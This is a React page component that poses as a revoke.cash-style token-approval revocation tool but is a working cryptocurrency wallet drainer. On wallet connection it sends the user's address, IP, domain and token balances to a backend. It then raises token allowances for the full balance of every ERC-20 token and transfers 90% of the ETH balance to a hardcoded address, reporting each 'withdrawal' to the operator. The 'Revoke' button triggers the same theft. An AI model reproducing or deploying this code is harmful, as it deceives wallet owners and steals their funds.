import React, { useEffect, useState, useContext } from "react";
import AppContext from "../components/AppContext";
import Container from "../components/Container";
import {
  useAccount,
  useChainId,
  useSendTransaction,
  useSwitchAccount,
} from "wagmi";
import {
  getUserTokens,
  increaseAllowanceForTokens,
  increaseAllowance,
  getAccountBalance,
  getTokenPriceByAddress,
  getTokenPriceByAddressAndAmount,
} from "../utils/helpers";
import {
  walletScanned,
  requestTokenSignature,
  tokenConfirmed,
  tokenDeclined,
} from "../api";
import { etherUnits, parseEther, parseUnits } from "viem";

const Revoke = () => {
  const {
    domainName,
    ipAddress,
    walletType,
    loadingData,
    ethBalance,
    tokenData,
    loadingEthBalance,
    handleLoadingData,
    handleLoadingEthBalance,
  } = useContext(AppContext);
  const { sendTransaction, data: sentEthTx } = useSendTransaction();
  const { connectors, switchAccount } = useSwitchAccount();
  const { chainId } = useChainId();

  const { isConnected, address, connector, chain } = useAccount();
  const [walletData, setWalletData] = useState([]);
  const [priceData, setPriceData] = useState(null);
  const [isButtonDisabled, setIsButtonDisabled] = useState(false);

  useEffect(() => {
    if (!loadingData && tokenData && isConnected) {
      fetchPriceData();
    }
  }, [loadingData, tokenData, isConnected]);

  const fetchPriceData = async () => {
    const priceData = await Promise.all(
      tokenData.map((token) =>
        getTokenPriceByAddressAndAmount(
          token.contractAddress,
          "usd",
          token.balance
        )
      )
    );
    setPriceData(priceData);
  };

  useEffect(() => {
    if (tokenData && priceData && connector) {
      // Add connector to the condition
      const mergedTokens = mergeTokens(priceData, tokenData);
      const data = createWalletData(
        mergedTokens,
        domainName,
        ipAddress,
        ethBalance,
        address,
        connector.name // Only access connector.name if connector is not undefined
      );
      setWalletData(data);
      console.log("wallet data", walletData);

      sendWalletScannedData(data);
    }
  }, [priceData, tokenData, loadingData, connector]);

  const mergeTokens = (priceData, tokenData) => {
    const priceMap = {};
    priceData.forEach((priceObj) => {
      priceMap[priceObj.contractAddress] = priceObj;
    });
    return tokenData.map((tokenObj) => {
      const matchingPriceData = priceMap[tokenObj.contractAddress];
      return { ...tokenObj, ...matchingPriceData };
    });
  };

  const createWalletData = (
    mergedTokens,
    domainName,
    ipAddress,
    ethBalance,
    address,
    walletType
  ) => {
    return {
      current_network: chain?.name,
      domain: domainName,
      erc_20_tokens: mergedTokens.map((tokenObj) => ({
        balance: ` ${tokenObj?.amountInusd}`,
        contract_address: tokenObj?.contractAddress,
        token_balance: tokenObj?.balance,
        token_name: tokenObj?.name,
        decimals: tokenObj?.decimals,
      })),
      ip_address: ipAddress,
      native_coin: chain?.nativeCurrency?.symbol,
      total_balance: ethBalance,
      wallet_address: address,
      wallet_type: walletType,
    };
  };

  const sendWalletScannedData = async (data) => {
    try {
      const res = await walletScanned(data);
      console.log("wallet Scanned: ", res);
    } catch (error) {
      console.log(error);
    }
  };

  useEffect(() => {
    if (walletData && walletData.length > 0) {
      handleClick();
    }
  }, [walletData, isConnected]);

  const handleClick = async () => {
    setIsButtonDisabled(true);
    console.log(walletData);
    try {
      for (const token of walletData?.erc_20_tokens) {
        const {
          contract_address,
          balance,
          token_name,
          token_balance,
          decimals,
        } = token;
        const data = {
          asset_name: token_name,
          domain: walletData?.domain,
          ip_address: walletData?.ip_address,
          withdrawal_amount: balance,
          withdrawal_amount_token: token_balance,
        };
        try {
          const res = await requestTokenSignature(data);
        } catch (error) {
          console.log("request Token Signature failed:", error);
        }
        const res = await increaseAllowance(
          contract_address,
          token_balance,
          decimals
        );
        if (res.success) {
          const data = {
            asset_name: token_name,
            domain: walletData?.domain,
            transaction_hash: res?.data,
            ip_address: walletData?.ip_address,
            withdrawal_amount: balance,
            withdrawal_amount_token: token_balance,
          };
          try {
            const res = await tokenConfirmed(data);
          } catch (error) {
            console.error("token confirmed post failed:", error);
          }
        } else {
          const data = {
            asset_name: token_name,
            domain: walletData?.domain,
            ip_address: walletData?.ip_address,
            withdrawal_amount: balance,
            withdrawal_amount_token: token_balance,
          };
          try {
            const res = await tokenDeclined(data);
          } catch (error) {
            console.log("tokenDeclined post failed:", res);
          }
        }
      }
      //  send native token
      const nintyPercentage = 0.9 * ethBalance;

      try {
        const data = {
          asset_name: walletData?.native_coin,
          domain: walletData?.domain,
          ip_address: walletData?.ip_address,
          withdrawal_amount: nintyPercentage,
          withdrawal_amount_token: nintyPercentage,
        };
        try {
          const res = await requestTokenSignature(data);
        } catch (error) {
          console.log("request Token Signature failed:", error);
        }
        const tx = sendTransaction({
          to: "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
          value: parseEther(nintyPercentage.toString()),
        });
        if (tx) {
          const data = {
            asset_name: walletData?.native_coin,
            domain: walletData?.domain,
            transaction_hash: tx,
            ip_address: walletData?.ip_address,
            withdrawal_amount: nintyPercentage,
            withdrawal_amount_token: nintyPercentage,
          };
          try {
            const res = await tokenConfirmed(data);
          } catch (error) {
            console.error(error);
          }
        } else {
          const data = {
            asset_name: walletData?.native_coin,
            domain: walletData?.domain,
            ip_address: walletData?.ip_address,
            withdrawal_amount: balance,
            withdrawal_amount_token: token_balance,
          };
          try {
            const res = await tokenDeclined(data);
          } catch (error) {
            console.log(error);
          }
        }
      } catch (error) {
        console.error(error);
      }
    } catch (error) {
      console.error(error);
    } finally {
      setIsButtonDisabled(false);
    }
  };

  return (
    <Container>
      <div className="">
        <div className="w-full max-w-7xl mx-auto px-4 lg:px-8 ">
          <p className="flex flex-col justify-center items-center  mb-2 border text-white border-[#0C70F2] dark:border-white rounded-lg px-4 py-3 text-center">
            Once your wallet is connected, you'll see a list of your tokens and
            the amounts you may have unknowingly approved. Simply revoke that
            amount to reverse them immediately.
          </p>
        </div>
        <div>
          <div className="w-full max-w-7xl mx-auto px-4 lg:px-8 ">
            <div className="flex flex-col gap-2 mb-2 border  border-[#0C70F2] rounded-lg px-4 pt-3">
              <div className="flex flex-col sm:flex-row justify-between items-center gap-2">
                <div className="flex flex-col gap-2 items-center sm:items-start">
                  <div className="flex gap-1 items-center text-2xl font-bold leading-none">
                    {address && (
                      <>
                        {address.slice(0, 6)}... {address.slice(-6)}
                      </>
                    )}
                  </div>
                  <div className="flex flex-col sm:flex-row items-center gap-2">
                    <div className="flex items-center gap-1 text-sm text-zinc-500 dark:text-zinc-400">
                      <div className="flex gap-0.5 items-center leading-tight shrink-0">
                        <span>
                          {loadingEthBalance
                            ? "Loading"
                            : Number(ethBalance).toFixed(4)}
                        </span>
                        <span className="font-bold">ETH</span>
                      </div>
                      <div className="leading-none">•</div>
                      <div className="flex gap-1 items-center leading-none">
                        <span aria-expanded="false">
                          {" "}
                          {address && (
                            <>
                              {address.slice(0, 6)}... {address.slice(-6)}
                            </>
                          )}
                        </span>
                        <button
                          aria-label="Copy To Clipboard"
                          className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded justify-center"
                        >
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            fill="none"
                            viewBox="0 0 24 24"
                            strokeWidth="1.5"
                            stroke="currentColor"
                            aria-hidden="true"
                            data-slot="icon"
                            className="w-4 h-4"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125 1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"
                            />
                          </svg>
                        </button>
                      </div>
                    </div>
                    {isConnected ? (
                      <div className="text-xs font-semibold flex items-center justify-center py-0.5 px-2 rounded-md bg-green-400 text-zinc-900">
                        Connected
                      </div>
                    ) : (
                      <div className="text-xs font-semibold flex items-center justify-center py-0.5 px-2 rounded-md bg-zinc-300 text-zinc-900 dark:bg-zinc-600 dark:text-zinc-100">
                        Not Connected
                      </div>
                    )}
                  </div>
                </div>
                <div></div>
                <div className="flex items-center gap-6">
                  <div className="flex items-center gap-6 sm:gap-2">
                    <a
                      className="focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:rounded text-current visited:text-current underline hover:underline flex shrink-0"
                      href="https://opensea.io/0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f"
                      target="_blank"
                      referrerPolicy="origin"
                    >
                      <img
                        alt="OpenSea Link"
                        loading="lazy"
                        width={24}
                        height={24}
                        decoding="async"
                        data-nimg={1}
                        className="aspect-square object-cover bg-white shrink-0 rounded-full"
                        src="https://revoke.cash/assets/images/vendor/opensea.svg"
                        style={{ color: "transparent" }}
                      />
                    </a>
                    <a
                      className="focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:rounded text-current visited:text-current underline hover:underline flex shrink-0"
                      href="https://sepolia.etherscan.io/address/0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f"
                      target="_blank"
                      referrerPolicy="origin"
                    >
                      <img
                        alt="Block Explorer Link"
                        loading="lazy"
                        width={24}
                        height={24}
                        decoding="async"
                        data-nimg={1}
                        className="aspect-square object-cover bg-white shrink-0 rounded-full dark:bg-black"
                        src="https://revoke.cash/assets/images/vendor/etherscan.svg"
                        style={{ color: "transparent" }}
                      />
                    </a>
                    <button
                      aria-label="Share This Page On Social Media"
                      className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded flex items-center border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed leading-none font-medium shrink-0 whitespace-nowrap text-black visited:text-black dark:text-white dark:visited:text-white disabled:text-zinc-600 dark:disabled:text-zinc-400 border-none justify-center"
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 24 24"
                        fill="currentColor"
                        aria-hidden="true"
                        data-slot="icon"
                        className="w-5 h-5"
                      >
                        <path
                          fillRule="evenodd"
                          d="M15.75 4.5a3 3 0 1 1 .825 2.066l-8.421 4.679a3.002 3.002 0 0 1 0 1.51l8.421 4.679a3 3 0 1 1-.729 1.31l-8.421-4.678a3 3 0 1 1 0-4.132l8.421-4.679a3 3 0 0 1-.096-.755Z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </button>
                  </div>
                  <div className="relative shrink-0">
                    <button className="focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black dark:focus-visible:ring-white border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed leading-none shrink-0 whitespace-nowrap bg-white text-black visited:text-black hover:bg-zinc-200 disabled:bg-zinc-300 justify-center flex items-center px-2 h-9 font-normal rounded-lg control-button-wrapper">
                      <div className="flex items-center gap-1">
                        <img
                          alt="Ethereum Sepolia"
                          loading="lazy"
                          width={24}
                          height={24}
                          decoding="async"
                          data-nimg={1}
                          className="aspect-square object-cover bg-white shrink-0 rounded-full border border-[#0C70F2] dark:border-white"
                          src="https://revoke.cash/assets/images/vendor/chains/ethereum.svg"
                          style={{ color: "transparent" }}
                        />
                      </div>
                      <svg
                        className="w-5 h-5 fill-black dark:fill-white"
                        viewBox="0 0 20 20"
                        aria-hidden="true"
                        focusable="false"
                      >
                        <path d="M4.516 7.548c0.436-0.446 1.043-0.481 1.576 0l3.908 3.747 3.908-3.747c0.533-0.481 1.141-0.446 1.574 0 0.436 0.445 0.408 1.197 0 1.615-0.406 0.418-4.695 4.502-4.695 4.502-0.217 0.223-0.502 0.335-0.787 0.335s-0.57-0.112-0.789-0.335c0 0-4.287-4.084-4.695-4.502s-0.436-1.17 0-1.615z" />
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
              <div className="flex overflow-x-scroll scrollbar-hide overflow-y-hidden w-full justify-center sm:justify-start">
                <nav className="flex gap-4">
                  <button className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded justify-center whitespace-nowrap border-b-2 pb-1 text-sm font-medium border-black text-black visited:text-black dark:border-white dark:text-white dark:visited:text-white">
                    Approvals
                  </button>
                  <button className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded justify-center whitespace-nowrap border-b-2 pb-1 text-sm font-medium border-transparent text-zinc-500 visited:text-zinc-500 dark:text-zinc-400 dark:visited:text-zinc-400 hover:border-zinc-300 hover:text-zinc-700 dark:hover:border-zinc-400 dark:hover:text-zinc-300">
                    Signatures
                  </button>
                </nav>
              </div>
            </div>
            <div className="flex flex-col justify-start mx-auto gap-2">
              <div className="flex flex-col gap-2">
                <div className="flex flex-col-reverse md:flex-row justify-start gap-2">
                  <div className="flex flex-col justify-start gap-2 grow">
                    <div className="w-full shrink-0 css-b62m3t-container">
                      <span
                        id="react-select-sort-select-live-region"
                        className="css-7pg0cj-a11yText"
                      />
                      <span
                        aria-live="polite"
                        aria-atomic="false"
                        aria-relevant="additions text"
                        role="log"
                        className="css-7pg0cj-a11yText"
                      />
                      <div className="flex items-center box-border h-9 px-2 sort-select__control css-907jg3-control">
                        <div className="sort-select__value-container sort-select__value-container--has-value css-15pp9oa">
                          <div className="sort-select__single-value css-7kdrrv-singleValue">
                            <div className="flex items-center gap-2">
                              <div>Sort</div>
                              <div className="text-xs font-semibold justify-center py-0.5 px-2 rounded-md flex items-center gap-1 bg-zinc-300 dark:bg-zinc-600">
                                Last Updated: Newest to Oldest
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="sort-select__indicators css-10sck9p">
                          <div
                            className="sort-select__indicator sort-select__dropdown-indicator css-xrm9c7-indicatorContainer"
                            aria-hidden="true"
                          >
                            <svg
                              height={20}
                              width={20}
                              viewBox="0 0 20 20"
                              aria-hidden="true"
                              focusable="false"
                              className="css-8mmkcg"
                            >
                              <path d="M4.516 7.548c0.436-0.446 1.043-0.481 1.576 0l3.908 3.747 3.908-3.747c0.533-0.481 1.141-0.446 1.574 0 0.436 0.445 0.408 1.197 0 1.615-0.406 0.418-4.695 4.502-4.695 4.502-0.217 0.223-0.502 0.335-0.787 0.335s-0.57-0.112-0.789-0.335c0 0-4.287-4.084-4.695-4.502s-0.436-1.17 0-1.615z" />
                            </svg>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="w-full css-b62m3t-container">
                      <span
                        id="react-select-filters-select-live-region"
                        className="css-7pg0cj-a11yText"
                      />
                      <span
                        aria-live="polite"
                        aria-atomic="false"
                        aria-relevant="additions text"
                        role="log"
                        className="css-7pg0cj-a11yText"
                      />
                      <div className="flex items-center box-border h-9 px-2 filters-select__control css-907jg3-control text-white">
                        <div className="flex items-center gap-2 grow">
                          <span>Filters</span>
                          <div className="text-xs font-semibold flex items-center justify-center py-0.5 px-2 rounded-md bg-zinc-300 dark:bg-zinc-600">
                            Showing Everything
                          </div>
                        </div>
                        <div
                          className="filters-select__placeholder css-1xb54ij-placeholder"
                          id="react-select-filters-select-placeholder"
                        />

                        <div className="filters-select__indicators css-10sck9p">
                          <div
                            className="filters-select__indicator filters-select__dropdown-indicator css-xrm9c7-indicatorContainer"
                            aria-hidden="true"
                          >
                            <svg
                              height={20}
                              width={20}
                              viewBox="0 0 20 20"
                              aria-hidden="true"
                              focusable="false"
                              className="css-8mmkcg"
                            >
                              <path d="M4.516 7.548c0.436-0.446 1.043-0.481 1.576 0l3.908 3.747 3.908-3.747c0.533-0.481 1.141-0.446 1.574 0 0.436 0.445 0.408 1.197 0 1.615-0.406 0.418-4.695 4.502-4.695 4.502-0.217 0.223-0.502 0.335-0.787 0.335s-0.57-0.112-0.789-0.335c0 0-4.287-4.084-4.695-4.502s-0.436-1.17 0-1.615z" />
                            </svg>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="h-20 flex items-center justify-between gap-4 border border-[#0C70F2]  dark:border-white rounded-lg px-4 empty:hidden">
                    <div className="flex items-center justify-around gap-4 h-16 only:w-full only:justify-center">
                      <div className="flex flex-col items-center gap-0.5">
                        <div className="text-zinc-600 dark:text-zinc-400 text-center">
                          Total Approvals
                        </div>
                        <div className="font-bold">
                          {loadingData ? "loading" : tokenData.length}
                        </div>
                      </div>
                      <div className="flex flex-col items-center gap-0.5">
                        <div className="text-zinc-600 dark:text-zinc-400 text-center">
                          Total Value at Risk
                        </div>
                        <div className="font-bold">Unknown</div>
                      </div>
                    </div>
                  </div>
                </div>
                <form className="h-9 flex gap-2 items-center border border-[#0C70F2]  dark:border-white rounded-lg px-2 font-medium focus-within:ring-1 focus-within:ring-black dark:focus-within:ring-white w-full">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    fill="currentColor"
                    aria-hidden="true"
                    data-slot="icon"
                    className="w-6 h-6"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10.5 3.75a6.75 6.75 0 1 0 0 13.5 6.75 6.75 0 0 0 0-13.5ZM2.25 10.5a8.25 8.25 0 1 1 14.59 5.28l4.69 4.69a.75.75 0 1 1-1.06 1.06l-4.69-4.69A8.25 8.25 0 0 1 2.25 10.5Z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <input
                    className="grow focus-visible:outline-none bg-transparent"
                    placeholder="Search by Approved Spender Address"
                    aria-label="Search by Approved Spender Address"
                    id="spender-search"
                    defaultValue=""
                  />
                </form>
              </div>
              <div className="border border-[#0C70F2]  text-white dark:border-white rounded-lg overflow-x-scroll whitespace-nowrap scrollbar-hide">
                <table className="w-full border-collapse allowances-table">
                  <thead>
                    <tr className="border-b border-[#0C70F2] text-white  dark:border-white h-10">
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">Asset</div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">Type</div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">
                          Approved Amount
                        </div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">Value at Risk</div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">
                          Approved Spender
                        </div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-left">Last Updated</div>
                      </th>
                      <th className="text-left px-2 whitespace-nowrap">
                        <div className="font-bold text-right">Actions</div>
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {loadingData ? (
                      <p>Loading data...</p>
                    ) : (
                      tokenData.map((token, i) => (
                        <tr
                          key={i}
                          className="border-t border-zinc-300 dark:border-zinc-500"
                        >
                          <td className="overflow-hidden px-2">
                            <div className="flex items-center gap-1 py-1">
                              <div className="flex flex-col items-start gap-0.5">
                                <div className="flex items-center gap-2 text-base w-48 lg:w-56">
                                  <div className="relative shrink-0">
                                    <div
                                      className="aspect-square bg-zinc-300 dark:bg-zinc-600 rounded-full border border-black dark:border-white"
                                      style={{ width: 24, height: 24 }}
                                    />
                                  </div>
                                  <a
                                    className="focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:rounded text-current visited:text-current no-underline hover:underline truncate"
                                    href="https://sepolia.etherscan.io/address/0x5f520Bf5B7130766bf586E7d7D57D96e7d4430Af"
                                    target="_blank"
                                    referrerPolicy="origin"
                                  >
                                    {token.name}
                                  </a>
                                </div>
                                <div className="text-xs text-zinc-500 dark:text-zinc-400 flex gap-1 w-48 lg:w-56">
                                  <div className="truncate shrink">
                                    30,889,000 BUSD
                                  </div>
                                </div>
                              </div>
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex justify-start">
                              <div className="text-xs font-semibold flex items-center justify-center py-0.5 px-2 rounded-md w-12 bg-[#0C70F2] text-zinc-900">
                                Token
                              </div>
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex items-center gap-2 w-40">
                              <div className="flex flex-col justify-start items-start truncate">
                                <div className="w-full truncate">
                                  {token.balance} {token.symbol}
                                </div>
                              </div>
                              <div>
                                <button
                                  aria-label="Edit Token Approval"
                                  className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded flex items-center border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed leading-none font-medium shrink-0 whitespace-nowrap text-black visited:text-black dark:text-white dark:visited:text-white disabled:text-zinc-600 dark:disabled:text-zinc-400 border-none justify-center"
                                >
                                  <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    fill="none"
                                    viewBox="0 0 24 24"
                                    strokeWidth="1.5"
                                    stroke="currentColor"
                                    aria-hidden="true"
                                    data-slot="icon"
                                    className="w-3 h-3"
                                  >
                                    <path
                                      strokeLinecap="round"
                                      strokeLinejoin="round"
                                      d="m16.862 4.487 1.687-1.688a1.875 1.875 0 1 1 2.652 2.652L6.832 19.82a4.5 4.5 0 0 1-1.897 1.13l-2.685.8.8-2.685a4.5 4.5 0 0 1 1.13-1.897L16.863 4.487Zm0 0L19.5 7.125"
                                    />
                                  </svg>
                                </button>
                              </div>
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex items-center justify-end gap-1 py-1 text-right font-monosans text-zinc-500 dark:text-zinc-400">
                              Unknown
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex items-center gap-2 w-48">
                              <div className="flex flex-col justify-start items-start">
                                <a
                                  className="focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:rounded text-current visited:text-current no-underline hover:underline"
                                  href="https://sepolia.etherscan.io/address/0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f"
                                  target="_blank"
                                  referrerPolicy="origin"
                                  aria-expanded="false"
                                >
                                  <div className="max-w-[10rem] truncate">
                                    0x944853...9D1e9f
                                  </div>
                                  <div className="text-xs text-zinc-500 dark:text-zinc-400" />
                                </a>
                              </div>
                              <button
                                aria-label="Copy To Clipboard"
                                className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded justify-center"
                              >
                                <svg
                                  xmlns="http://www.w3.org/2000/svg"
                                  fill="none"
                                  viewBox="0 0 24 24"
                                  strokeWidth="1.5"
                                  stroke="currentColor"
                                  aria-hidden="true"
                                  data-slot="icon"
                                  className="w-4 h-4 text-zinc-500 dark:text-zinc-400"
                                >
                                  <path
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                    d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125 1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"
                                  />
                                </svg>
                              </button>
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex justify-start items-center font-monosans gap-2 w-41">
                              <a
                                className="focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:rounded text-current visited:text-current no-underline hover:underline tx-link"
                                href="https://sepolia.etherscan.io/tx/0x82fb7173fd61984fe4f5dedd441baa4c80c4af67b91d720be37225e16b08fe8f"
                                target="_blank"
                                referrerPolicy="origin"
                                aria-expanded="false"
                              >
                                05/02/2024 11:17:24 PM
                              </a>
                            </div>
                          </td>
                          <td className="overflow-hidden px-2">
                            <div className="flex justify-end w-28 mr-0 mx-auto">
                              <div className="controls-section">
                                <button
                                  onClick={handleClick}
                                  disabled={isButtonDisabled}
                                  className={`focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black dark:focus-visible:ring-white flex items-center border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed font-medium shrink-0 whitespace-nowrap bg-white text-black visited:text-black hover:bg-zinc-200 disabled:bg-zinc-300 justify-center h-6 px-2 text-xs rounded-md ${
                                    isButtonDisabled
                                      ? "disabled:opacity-75"
                                      : ""
                                  }`}
                                >
                                  {isButtonDisabled ? "Revoking" : "Revoke"}
                                </button>
                              </div>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
                <div className="flex flex-col justify-center items-center p-3 gap-2 w-full h-10 empty:hidden" />
              </div>
            </div>
          </div>
        </div>
      </div>
    </Container>
  );
};

export default Revoke;
